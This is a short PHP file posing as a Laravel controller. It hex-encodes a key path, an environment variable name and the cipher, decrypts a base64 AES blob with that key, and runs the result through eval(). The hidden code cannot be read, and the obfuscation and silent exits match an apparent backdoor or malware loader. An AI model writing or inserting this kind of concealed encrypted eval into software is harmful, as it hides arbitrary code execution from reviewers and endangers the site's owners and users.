<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('pBr+ClLz8DBngjXRdEt5Jw==');

$c=base64_decode(

'cCR+ARj0ZhAiij1/3bxcPevWbu2kcyG54Rdg219Y4XYk6jOuaZNuzXV6qgGj2iU4IKIADgkJceRE' .
'U3jdqqs1cgyvDFx6rNuN8HXGGrJVQcbV+9R2xkPbz76JhYWA+uX32qGoPqj68HqmfPUF67YxLISf' .
'0p477wI0l4c36oxZeiWK0H7kYH/VDmrzgwWkmMWHeJhZG9ul/7rlklrvVpB2JiBpdWm5VJI5/fMd' .
'd7BsgcMFUgpEtaEiVqUwYUCjj8MRwsLwtSEB4icdARyccEy5DHot/35dh/HvgehNdUnbS80='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

